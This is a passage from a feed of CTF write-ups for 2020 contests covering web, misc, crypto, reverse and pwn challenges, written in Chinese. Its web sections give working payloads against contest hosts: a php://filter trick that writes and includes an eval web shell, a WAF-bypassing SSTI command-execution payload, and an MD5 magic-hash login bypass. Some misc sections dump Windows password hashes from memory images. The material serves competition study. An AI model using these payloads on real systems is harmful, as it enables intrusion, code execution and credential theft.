    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/iconv|UCS|UTF|rot|quoted|base64|%|toupper|tolower|dechunk|\.\./i'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token string">'&lt;?php exit();'</span> <span class="token punctuation">.</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>payload:</p>
<pre><code>http://eci-2zecngytg1no58dxm6mu.cloudeci1.ichunqiu.com/7fa3b767c460b54a2be4d49030b349c7.php?content=php://filter/write=string.strip_tags/?%3EPD9waHAgZXZhbCgkX1JFUVVFU1RbJ0EnXSk7cGhwaW5mbygpOw%3D%3D%3C?123456/resource=2.php</code></pre><p>写入base64编码的payload然后利用之前的文件包含的点去base64解码包含来绕过死亡exit。</p>
<p>然后用之前的文件包含去包含：</p>
<pre><code>http://eci-2zecngytg1no58dxm6mu.cloudeci1.ichunqiu.com/index.php?page=php://filter/read=convert.base64-decode/resource=sandbox/4e5b09b2149f7619cca155c8bd6d8ee5/aa.php</code></pre><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91wp/16035911807851.jpg" alt=""></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2020湖湘杯WP</title>
    <url>/2020/11/01/hu-xiang-bei-2020/</url>
    <content><![CDATA[<blockquote>
<p>平台卡了一下午加一晚上就离谱，最后差一个题QAQ</p>
</blockquote>
<blockquote>
<p> 部分比赛题目都存了一份打包上传了，链接如下：</p>
<p> 链接: <a href="https://pan.baidu.com/s/1kbzuWl44zkslzEGUSnc3aQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1kbzuWl44zkslzEGUSnc3aQ</a>  密码: iilt</p>
</blockquote>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="题目名字不重要反正题挺简单的"><a href="#题目名字不重要反正题挺简单的" class="headerlink" title="题目名字不重要反正题挺简单的"></a>题目名字不重要反正题挺简单的</h3><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E6%B9%96%E6%B9%98%E6%9D%AF/web1.png" alt="图片"></p>
<h3 id="new-website"><a href="#new-website" class="headerlink" title="new website"></a>new website</h3><pre class=" language-plain"><code class="language-plain">ip: 47.111.96.55
port: 54900
protocol: http</code></pre>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E6%B9%96%E6%B9%98%E6%9D%AF/web2-1.png" alt="图片"></p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E6%B9%96%E6%B9%98%E6%9D%AF/web2-2.png" alt="图片"></p>
<p>24eaa438e7c1f0720823cf76d9c52f7d</p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="passwd"><a href="#passwd" class="headerlink" title="passwd"></a>passwd</h3><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E6%B9%96%E6%B9%98%E6%9D%AF/misc1.png" alt="图片"></p>
<p>然后去这个网站解密：</p>
<p><a href="https://www.objectif-securite.ch/ophcrack" target="_blank" rel="noopener">https://www.objectif-securite.ch/ophcrack</a></p>
<p>解出明文：qwer1234</p>
<p>再去sha1</p>
<h3 id="颜文字"><a href="#颜文字" class="headerlink" title="颜文字"></a>颜文字</h3><p>给了个流量包</p>
<p>提取出http传输文件</p>
<p>发现有个index-demo.html</p>
<p>在源码中发现大量base64编码</p>
<p>写个脚本解码了，得到如下：</p>
<pre class=" language-plain"><code class="language-plain">(｡･∀･)ﾉﾞ嗨Hi~ 

(＠_＠;)(＠_＠;)(＠_＠;)

(+_+)?(。>︿<)_θ(。>︿<)_θ

o(*￣▽￣*)ブ゜

＜（＾－＾）＞(╯▽╰ )好香~~

ヽ(✿ﾟ▽ﾟ)ノ(＠＾０＾)

(^^ゞΨ(￣∀￣)Ψ*★,°*:.☆(￣▽￣)/$:*.°★* 。

~\(≧▽≦)/~o(^▽^)o(¬‿¬)(*≧︶≦))(￣▽￣* )ゞ┳━┳(╯‵□′)╯︵┻━┻

┳━┳ ノ( ゜-゜ノ)ಠ_ಠ

ಠ_ಠ(╯‵□′)╯炸弹！•••*～●(¬_¬ )

(ノへ￣、)o(￣┰￣*)ゞ╰(艹皿艹 )（︶^︶）(* ￣︿￣)(￣ε(#￣)

(ﾟДﾟ*)ﾉ○|￣|_ =3(ノ｀Д)ノ(′д｀σ)σ(￢︿̫̿￢☆)～( TロT)σ<( ‵□′)>──

(¬_¬")(￣﹏￣；)(╯°□°）╯︵ ┻━┻ヽ(゜▽゜ )－C<(/;◇;)/~(ヘ･_･)ヘ┳━┳

ಠ_ಠ(╯‵□′)╯炸弹！•••*～●(¬_¬ )

(⊙ˍ⊙)？(σ｀д′)σ<( ‵□′)>───Ｃε(┬﹏┬)3<( ‵□′)───C＜─___-)||～( TロT)σ(〃

⊙﹏⊙∥ヽ(*。>Д<)o゜/(ㄒoㄒ)/~~(#_<-)（＞人＜；）

(ノへ￣、)o(￣┰￣*)ゞ╰(艹皿艹 )（︶^︶）(* ￣︿￣)(￣ε(#￣)

(ﾟДﾟ*)ﾉ○|￣|_ =3(ノ｀Д)ノ(′д｀σ)σ(￢︿̫̿￢☆)～( TロT)σ<( ‵□′)>──

(⊙ˍ⊙)？(σ｀д′)σ<( ‵□′)>───Ｃε(┬﹏┬)3<( ‵□′)───C＜─___-)||～( TロT)σ(〃＞目＜)

(oﾟvﾟ)ノd=====(￣▽￣*)bε=ε=ε=(~￣▽￣)~(❤ ω ❤)U•ェ•*U

(ﾟДﾟ*)ﾉ○|￣|_ =3(ノ｀Д)ノ(′д｀σ)σ(￢︿̫̿￢☆)～( TロT)σ<( ‵□′)>──

(⊙ˍ⊙)？(σ｀д′)σ<( ‵□′)>───Ｃε(┬﹏┬)3<( ‵□′)───C＜─___-)||～( TロT)σ(〃＞目＜)

(oﾟvﾟ)ノd=====(￣▽￣*)bε=ε=ε=(~￣▽￣)~(❤ ω ❤)U•ェ•*U

(ﾟДﾟ*)ﾉ○|￣|_ =3(ノ｀Д)ノ(′д｀σ)σ(￢︿̫̿￢☆)～( TロT)σ<( ‵□′)>──

(⊙ˍ⊙)？(σ｀д′)σ<( ‵□′)>───Ｃε(┬﹏┬)3<( ‵□′)───C＜─___-)||～( TロT)σ(〃＞目＜)

(oﾟvﾟ)ノd=====(￣▽￣*)bε=ε=ε=(~￣▽￣)~(❤ ω ❤)U•ェ•*U

(ﾟДﾟ*)ﾉ○|￣|_ =3(ノ｀Д)ノ(′д｀σ)σ(￢︿̫̿￢☆)～( TロT)σ<( ‵□′)>──

(⊙ˍ⊙)？(σ｀д′)σ<( ‵□′)>───Ｃε(┬﹏┬)3<( ‵□′)───C＜─___-)||～( TロT)σ(〃＞目＜)

(oﾟvﾟ)ノd=====(￣▽￣*)bε=ε=ε=(~￣▽￣)~(❤ ω ❤)U•ェ•*U

(oﾟvﾟ)ノd=====(￣▽￣*)bε=ε=ε=(~￣▽￣)~(❤ ω ❤)U•ェ•*U

(ﾟДﾟ*)ﾉ○|￣|_ =3(ノ｀Д)ノ(′д｀σ)σ(￢︿̫̿￢☆)～( TロT)σ<( ‵□′)>──

(⊙ˍ⊙)？(σ｀д′)σ<( ‵□′)>───Ｃε(┬﹏┬)3<( ‵□′)───C＜─___-)||～( TロT)σ(〃＞目＜)

(oﾟvﾟ)ノd=====(￣▽￣*)bε=ε=ε=(~￣▽￣)~(❤ ω ❤)U•ェ•*U

(╯‵□′)╯炸弹！•••

(╯‵□′)╯炸弹！•••

(╯‵□′)╯炸弹！•••

(╯‵□′)╯炸弹！•••(╯‵□′)╯炸弹！•••(╯‵□′)╯炸弹！•••(╯‵□′)╯炸弹！•••

flag被我炸没了哈哈哈</code></pre>
<p>然后发现还有个base64隐写，得到：</p>
<p>key:”lorrie”</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E6%B9%96%E6%B9%98%E6%9D%AF/misc2-1.png" alt="图片"></p>
<pre class=" language-plain"><code class="language-plain">flag{→_→←_←←_←←_←←_← →_→→_→←_←←_←←_← →_→←_←←_←←_← ←_←←_←←_←→_→→_→ ←_←←_←←_
←→_→→_→ ←_← ←_←←_←←_←→_→→_→ →_→→_→→_→→_→←_← →_→←_←←_←←_← ←_←←_←←_←←_←←_←
 ←_←→_→→_→→_→→_→ →_→→_→→_→→_→→_→ ←_←←_←←_←←_←←_← ←_←←_←→_→←_← →_→←_←←_←←
_← ←_←←_←←_←←_←→_→ ←_←→_→ ←_←←_←→_→→_→→_→ →_→→_→→_→→_→←_← ←_←←_←←_←←_←←_
← ←_←←_←←_←→_→→_→ ←_←→_→ →_→→_→→_→→_→→_→ →_→←_←→_→←_← ←_← →_→→_→←_←←_←←_
← →_→→_→→_→→_→←_← →_→←_←→_→←_← ←_←←_←←_←→_→→_→ ←_←←_←←_←→_→→_→ →_→→_→←_←
←_←←_← →_→→_→→_→←_←←_←}</code></pre>
<p>然后莫斯<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E6%B9%96%E6%B9%98%E6%9D%AF/misc2-2.png" alt="图片"></p>
<h3 id="虚实之间"><a href="#虚实之间" class="headerlink" title="虚实之间"></a>虚实之间</h3><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E6%B9%96%E6%B9%98%E6%9D%AF/misc3-1.png" alt="图片"></p>
<p>123%asd!O</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E6%B9%96%E6%B9%98%E6%9D%AF/misc3-2.png" alt="图片"></p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E6%B9%96%E6%B9%98%E6%9D%AF/misc3-2.png" alt="图片">))</p>
<p>flag{febc7d2138555b9ebccb32b554dbb11c}</p>
<h3 id="隐藏的秘密"><a href="#隐藏的秘密" class="headerlink" title="隐藏的秘密"></a>隐藏的秘密</h3><p>前面常规分析，进程啥的</p>
<p>然后就看文件</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E6%B9%96%E6%B9%98%E6%9D%AF/misc4-1.png" alt="图片">))</p>
<p>看到这</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E6%B9%96%E6%B9%98%E6%9D%AF/misc4-2.png" alt="图片"></p>
<p>还有屏幕截图</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E6%B9%96%E6%B9%98%E6%9D%AF/misc4-3.png" alt="图片"></p>
<p>提取<img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E6%B9%96%E6%B9%98%E6%9D%AF/misc4-4.png" alt="图片"></p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E6%B9%96%E6%B9%98%E6%9D%AF/misc4-5.png" alt="图片"></p>
<p>然后vol.py -f 隐藏的秘密.vmem –profile=Win2003SP1x86 hashdump</p>
<p>批量解密一个一个试</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E6%B9%96%E6%B9%98%E6%9D%AF/misc4-6.jpg" alt="图片"></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="古典美"><a href="#古典美" class="headerlink" title="古典美++"></a>古典美++</h3><p><a href="https://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx" target="_blank" rel="noopener">https://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx</a></p>
<p>orderby</p>
<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="re2-easyre"><a href="#re2-easyre" class="headerlink" title="re2(easyre)"></a>re2(easyre)</h3><p>od动态调试，先检查输入字符串的长度为24，继续调试发现加密算法为：enc[i] = (flag[i]&lt;&lt;3)^(flag[i+1]&gt;&gt;5),enc[23] = (flag[0]&amp;0x0e)^(flag[23]&lt;&lt;3)，密文为：</p>
<pre class=" language-plain"><code class="language-plain">0x2B, 0x08, 0xA9, 0xc8, 0x97, 0x2f, 0xff, 0x8C, 0x92, 0xf0, 0xA3, 0x89, 0xF7, 0x26, 0x07, 0xA4, 0xDA, 0xEA, 0xB3, 0x91, 0xEF, 0xDC, 0x95, 0xAB</code></pre>
<p>使用这z3脚本解密：</p>
<pre class=" language-plain"><code class="language-plain">from z3 import *
enc = [0x2B, 0x08, 0xA9, 0xc8, 0x97, 0x2f, 0xff, 0x8C, 0x92, 0xf0, 0xA3, 0x89, 0xF7, 0x26, 0x07, 0xA4, 0xDA, 0xEA, 0xB3, 0x91, 0xEF, 0xDC, 0x95, 0xAB]
if __name__ == '__main__':
    flag = [101,97,53,121,114,101,95,49,115,95,53,48,95,101,97,53,121,95,116,48,95,121,48,117]
    d = ''
    for i in flag:
        d += chr(i)
    print d
    v1 = BitVec('v1',8)
    v2 = BitVec('v2',8)
    v3 = BitVec('v3',8)
    v4 = BitVec('v4',8)
    v5 = BitVec('v5',8)
    v6 = BitVec('v6',8)
    v7 = BitVec('v7',8)
    v8 = BitVec('v8',8)
    v9 = BitVec('v9',8)
    v10 = BitVec('v10',8)
    v11 = BitVec('v11',8)
    v12 = BitVec('v12',8)
    v13 = BitVec('v13',8)
    v14 = BitVec('v14',8)
    v15 = BitVec('v15',8)
    v16 = BitVec('v16',8)
    v17 = BitVec('v17',8)
    v18 = BitVec('v18',8)
    v19 = BitVec('v19',8)
    v20 = BitVec('v20',8)
    v21 = BitVec('v21',8)
    v22 = BitVec('v22',8)
    v23 = BitVec('v23',8)
    v24 = BitVec('v24',8)
    s = Solver()
    s.add((v24<<3)^((v1 & 0xe0)>>5)==enc[23])
    s.add((((v1<<3)^(v2>>5))^0)==enc[0])
    s.add((((v2<<3)^(v3>>5))^1)==enc[1])
    s.add((((v3<<3)^(v4>>5))^2)==enc[2])
    s.add((((v4<<3)^(v5>>5))^3)==enc[3])
    s.add((((v5<<3)^(v6>>5))^4)==enc[4])
    s.add((((v6<<3)^(v7>>5))^5)==enc[5])
    s.add((((v7<<3)^(v8>>5))^6)==enc[6])
    s.add((((v8<<3)^(v9>>5))^7)==enc[7])
    s.add((((v9<<3)^(v10>>5))^8)==enc[8])
    s.add((((v10<<3)^(v11>>5))^9)==enc[9])
    s.add((((v11<<3)^(v12>>5))^10)==enc[10])
    s.add((((v12<<3)^(v13>>5))^11)==enc[11])
    s.add((((v13<<3)^(v14>>5))^12)==enc[12])
    s.add((((v14<<3)^(v15>>5))^13)==enc[13])
    s.add((((v15<<3)^(v16>>5))^14)==enc[14])
    s.add((((v16<<3)^(v17>>5))^15)==enc[15])
    s.add((((v17<<3)^(v18>>5))^16)==enc[16])
    s.add((((v18<<3)^(v19>>5))^17)==enc[17])
    s.add((((v19<<3)^(v20>>5))^18)==enc[18])
    s.add((((v20<<3)^(v21>>5))^19)==enc[19])
    s.add((((v21<<3)^(v22>>5))^20)==enc[20])
    s.add((((v22<<3)^(v23>>5))^21)==enc[21])
    s.add((((v23<<3)^(v24>>5))^22)==enc[22])
    if s.check() == sat:
        print s.model()</code></pre>
<p>flag:md5(ea5yre_1s_50_ea5y_t0_y0u)</p>
<h3 id="ReMe"><a href="#ReMe" class="headerlink" title="ReMe"></a>ReMe</h3><p>使用IDA打开文件，查看字符串发现时Python写的代码转为exe文件，使用<a href="https://github.com/countercept/python-exe-unpacker" target="_blank" rel="noopener">https://github.com/countercept/python-exe-unpacker</a>返汇编出pyc文件，使用struct的头16个字符补全ReMe的magic number，使用uncomply6将ReMe.pyc转为python文件：</p>
<p>import sys, hashlib</p>
<p>check = [</p>
<p>‘e5438e78ec1de10a2693f9cffb930d23’,</p>
<p>‘08e8e8855af8ea652df54845d21b9d67’,</p>
<p>‘a905095f0d801abd5865d649a646b397’,</p>
<p>‘bac8510b0902185146c838cdf8ead8e0’,</p>
<p>‘f26f009a6dc171e0ca7a4a770fecd326’,</p>
<p>‘cffd0b9d37e7187483dc8dd19f4a8fa8’,</p>
<p>‘4cb467175ab6763a9867b9ed694a2780’,</p>
<p>‘8e50684ac9ef90dfdc6b2e75f2e23741’,</p>
<p>‘cffd0b9d37e7187483dc8dd19f4a8fa8’,</p>
<p>‘fd311e9877c3db59027597352999e91f’,</p>
<p>‘49733de19d912d4ad559736b1ae418a7’,</p>
<p>‘7fb523b42413495cc4e610456d1f1c84’,</p>
<p>‘8e50684ac9ef90dfdc6b2e75f2e23741’,</p>
<p>‘acb465dc618e6754de2193bf0410aafe’,</p>
<p>‘bc52c927138231e29e0b05419e741902’,</p>
<p>‘515b7eceeb8f22b53575afec4123e878’,</p>
<p>‘451660d67c64da6de6fadc66079e1d8a’,</p>
<p>‘8e50684ac9ef90dfdc6b2e75f2e23741’,</p>
<p>‘fe86104ce1853cb140b7ec0412d93837’,</p>
<p>‘acb465dc618e6754de2193bf0410aafe’,</p>
<p>‘c2bab7ea31577b955e2c2cac680fb2f4’,</p>
<p>‘8e50684ac9ef90dfdc6b2e75f2e23741’,</p>
<p>‘f077b3a47c09b44d7077877a5aff3699’,</p>
<p>‘620741f57e7fafe43216d6aa51666f1d’,</p>
<p>‘9e3b206e50925792c3234036de6a25ab’,</p>
<p>‘49733de19d912d4ad559736b1ae418a7’,</p>
<p>‘874992ac91866ce1430687aa9f7121fc’]</p>
<p>def func(num):</p>
<p>result = []</p>
<p>while num != 1:</p>
<p>num = num * 3 + 1 if num % 2 else num // 2</p>
<p>result.append(num)</p>
<p>return result</p>
<p>if <strong>name</strong> == ‘<strong>main</strong>‘:</p>
<p>print(‘Your input is not the FLAG!’)</p>
<p>inp = input()</p>
<p>if len(inp) != 27:</p>
<p>print(‘length error!’)</p>
<p>sys.exit(-1)</p>
<p>for i, ch in enumerate(inp):</p>
<p>ret_list = func(ord(ch))</p>
<p>s = ‘’</p>
<p>for idx in range(len(ret_list)):</p>
<p>s += str(ret_list[idx])</p>
<p>s += str(ret_list[(len(ret_list) - idx - 1)])</p>
<p>md5 = hashlib.md5()</p>
<p>md5.update(s.encode(‘utf-8’))</p>
<p>if md5.hexdigest() != check[i]:</p>
<p>sys.exit(i)</p>
<p>md5 = hashlib.md5()</p>
<p>md5.update(inp.encode(‘utf-8’))</p>
<p>print(‘You win!’)</p>
<p>print(‘flag{‘ + md5.hexdigest() + ‘}’)</p>
<p>使用脚本爆破：</p>
<pre class=" language-plain"><code class="language-plain">import hashlib
ch3cke = ['e5438e78ec1de10a2693f9cffb930d23','08e8e8855af8ea652df54845d21b9d67','a905095f0d801abd5865d649a646b397','bac8510b0902185146c838cdf8ead8e0','f26f009a6dc171e0ca7a4a770fecd326','cffd0b9d37e7187483dc8dd19f4a8fa8','4cb467175ab6763a9867b9ed694a2780','8e50684ac9ef90dfdc6b2e75f2e23741','cffd0b9d37e7187483dc8dd19f4a8fa8','fd311e9877c3db59027597352999e91f','49733de19d912d4ad559736b1ae418a7','7fb523b42413495cc4e610456d1f1c84','8e50684ac9ef90dfdc6b2e75f2e23741','acb465dc618e6754de2193bf0410aafe','bc52c927138231e29e0b05419e741902','515b7eceeb8f22b53575afec4123e878','451660d67c64da6de6fadc66079e1d8a','8e50684ac9ef90dfdc6b2e75f2e23741','fe86104ce1853cb140b7ec0412d93837','acb465dc618e6754de2193bf0410aafe','c2bab7ea31577b955e2c2cac680fb2f4','8e50684ac9ef90dfdc6b2e75f2e23741','f077b3a47c09b44d7077877a5aff3699','620741f57e7fafe43216d6aa51666f1d','9e3b206e50925792c3234036de6a25ab','49733de19d912d4ad559736b1ae418a7','874992ac91866ce1430687aa9f7121fc']
def func(num):
    result = []
    while num != 1:
        num = num * 3 + 1 if num % 2 else num // 2
        result.append(num)
    return result
if __name__ == '__main__':
    flag = ''
    for j in range(len(ch3cke)):
        for i in range(32, 128):
            ret_list = func(i)
            s = ''
            for idx in range(len(ret_list)):
                s += str(ret_list[idx])
                s += str(ret_list[(len(ret_list)-idx-1)])
            md5 = hashlib.md5()
            md5.update(s.encode('utf-8'))
            if md5.hexdigest() == ch3cke[j]:
                flag += chr(i)
    print flag
    md5 = hashlib.md5()
    md5.update(flag.encode('utf-8'))
    print md5.hexdigest()</code></pre>
<p>flag:<br>flag{My_M@th_3X+1_R3v_Te5t}</p>
<p>0584cfa2ce502951ef5606f6b99fc921</p>
<h3 id="easy-c"><a href="#easy-c" class="headerlink" title="easy_c++"></a>easy_c++</h3><p>ida 打开程序，未加壳，密文为：’7d21e&lt;e3&lt;:3;9;ji t r#w”$<em>{</em>+*$|,’，加密方式为：flag[i]^i，解密得：</p>
<p>flag = ‘’</p>
<p>for i in range(len(s)):</p>
<p>flag += chr(ord(s[i])^i)</p>
<p>flag：</p>
<p>7e02a9c4439056df0e2a7b432b0069b3</p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E6%B9%96%E6%B9%98%E6%9D%AF/pwn.png" alt="图片"></p>
<p>3f7ee29ac4b67dc52a1b52b7245662b8</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2020太湖杯WP</title>
    <url>/2020/11/07/tai-hu-bei-2020/</url>
    <content><![CDATA[<blockquote>
<p>比赛题目都存了一份打包上传了，链接如下：</p>
<p>链接: <a href="https://pan.baidu.com/s/1LtiIfyD6kxkwP1m_7pGaEQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1LtiIfyD6kxkwP1m_7pGaEQ</a>  密码: l8ir</p>
</blockquote>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="checkingame【已解决】"><a href="#checkingame【已解决】" class="headerlink" title="checkingame【已解决】"></a>checkingame【已解决】</h3><p>控制台执行</p>
<pre class=" language-plain"><code class="language-plain">var game = new Game();
game.winning()</code></pre>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E5%A4%AA%E6%B9%96%E6%9D%AF/web1.png" alt="图片"></p>
<h3 id="easyweb【已解决】"><a href="#easyweb【已解决】" class="headerlink" title="easyweb【已解决】"></a>easyweb【已解决】</h3><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>利用unicode编码规范化绕过waf，再加SSTI</p>
<p>payload：</p>
<pre class=" language-plain"><code class="language-plain">﹛﹛config.__class__.__init__.__globals__[＇os＇].popen(＇ls /＇).read()﹜﹜
﹛﹛config.__class__.__init__.__globals__[＇os＇].popen(＇cat /flag＇).read()﹜﹜</code></pre>
<blockquote>
<p><a href="https://www.anquanke.com/post/id/211363#h2-2" target="_blank" rel="noopener">https://www.anquanke.com/post/id/211363#h2-2</a></p>
</blockquote>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E5%A4%AA%E6%B9%96%E6%9D%AF/web2.png" alt="图片"></p>
<h3 id="crossfire"><a href="#crossfire" class="headerlink" title="crossfire"></a>crossfire</h3><h3 id="ezMD5【已解决】"><a href="#ezMD5【已解决】" class="headerlink" title="ezMD5【已解决】"></a>ezMD5【已解决】</h3><pre class=" language-php"><code class="language-php">
<span class="token variable">$result</span> <span class="token operator">=</span> @<span class="token function">auth</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span>  <span class="token keyword">and</span> <span class="token variable">$result</span> <span class="token operator">!==</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token keyword">echo</span> <span class="token string">"bingo : &lt;b>$flag&lt;/b>"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>数组报错<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E5%A4%AA%E6%B9%96%E6%9D%AF/web3.png" alt="图片"></p>
<p><a href="http://122.112.253.121:10032/robots.txt" target="_blank" rel="noopener">http://122.112.253.121:10032/robots.txt</a></p>
<p>auth.so</p>
<p>payload：</p>
<pre class=" language-plain"><code class="language-plain">name=240610708&password=abcdabcdabcdabcdabcdabcdabcdabcdQNKCDZO&submit=%E7%99%BB%E5%BD%95</code></pre>
<p><a href="https://ctftime.org/writeup/11325" target="_blank" rel="noopener">https://ctftime.org/writeup/11325</a><br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E5%A4%AA%E6%B9%96%E6%9D%AF/web3-2.png" alt="图片"></p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="memory【已解决】"><a href="#memory【已解决】" class="headerlink" title="memory【已解决】"></a>memory【已解决】</h3><p>flag{From_Mem_to_find_ans}</p>
<pre class=" language-plain"><code class="language-plain">vol.py -f dump --profile=Win7SP1x86_23418 pslist
vol.py -f dump --profile=Win7SP1x86_23418 dlllist
上面的没发现什么
看一下文件，太多..
vol.py -f dump --profile=Win7SP1x86_23418 filescan
发现进程有浏览器，看一下历史记录
vol.py -f dump --profile=Win7SP1x86_23418 iehistory
发现这个：
Volatility Foundation Volatility Framework 2.6.1
**************************************************
Process: 2072 explorer.exe
Cache type "URL " at 0x1a45000
Record length: 0x100
Location: :2020110520201106: link3@file:///C:/Users/link3/Desktop/Untitled.png
Last modified: 2020-11-05 00:11:38 UTC+0000
Last accessed: 2020-11-04 16:11:39 UTC+0000
File Offset: 0x100, Data Offset: 0x0, Data Length: 0x0
去文件列表找对应的文件，然后提取
vol.py -f dump --profile=Win7SP1x86_23418 dumpfiles -Q 0x000000003fdf6118 --name Untitled.png -D ./
得到flag</code></pre>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E5%A4%AA%E6%B9%96%E6%9D%AF/misc1-1.png" alt="图片"></p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E5%A4%AA%E6%B9%96%E6%9D%AF/misc1-2.png" alt="图片"></p>
<h3 id="misc-1"><a href="#misc-1" class="headerlink" title="misc"></a>misc</h3><p> 给了一个word和加密的压缩包</p>
<p>word内容base64</p>
<pre class=" language-plain"><code class="language-plain">Salted__xy RËM.ËJuÞZÒóÂ ppõéØD´l{ÒEGªÜ#ÀøÏ(¶o¨Náì@Eò?ä)ìàµtÚó;OïAeXéIÝwöpÐÍãÐø»èKúX7v:;ï%S¬Ò¾ä3jôIwÞÑÒ«v3$dÁKVlh¿°`¼µ9Í~ÂåÑ$6%äÉÿÚ5MõSÉÍòâDñû+0òö¬§ZWÓÙi(¬®§Pñ
ïÄógHÑ2þ$í²µL¿ÞgOKU[mýÅ¾Ø -.ªæ_âv9ùhF{¦ü
Þ²xsúñ¶ÇT£º°a"º}ÌÕ+ì@K×w·òf19¥FPÊ®©cÕaI\¸qúi»PÀÛoèÙÄÈ9A óÀøirìØJS     Ø]+^Ó_¼öýb>©ÉôX5táeô¼úV°(ï%å½|X^IW§!¢îë.¤+(ÀãQBR×LD^
Ñò·«îø¹2^°ûm¶AhÛ$]ÙØGoY*6w"p©3Í)g¯ÿárpþ(ü1öS
àBKýâ\I$H)òÊ{®9åö¸Ù@¶-µâ`Yaþ§çàñÈYýÉ+Í} Ü¬ç-ïøE¯ÔÕepÃ[íÍSþb¿È'H¤s2ïAÞ®jòItO&ozzß©ÎÏ¶|ìQåä¦­9"L¬ß]üBÜÑHVÃs´s¾yP;¿÷åG-EäS·rå15u§ªvzóqp¬Î[q¾NíÿC)¤Yª6³ùËqå¾qgÅÅ#i,è¾Ú´»Í÷!/¨Ý?­rä:fYîa0Ïô~]ÕïHk÷Ã?J¯t¢~9.N>Xçn°ú{B¡GeüíÝ"¶u#ùâ0}«ÂªÆÂ[÷çÒ
d¢üw±ÌG¬ÎgÁ³K½.i?y®CÚV°¼¡$
b2x o1qgþ³Üíä([»¿×gz3º~Q%Ã.PUÐ_ï©zè¦èþ
Àq«E[/ª*D
Þ.­¹¼:ª³'´*îCØ´Dª¡ÊË!P¶VùqâíRØø^</code></pre>
<p>AES rabbit都不行 不知道有没有密钥勾选</p>
<p>隐藏文字看到</p>
<p><code>waoootu.epj,nv o</code></p>
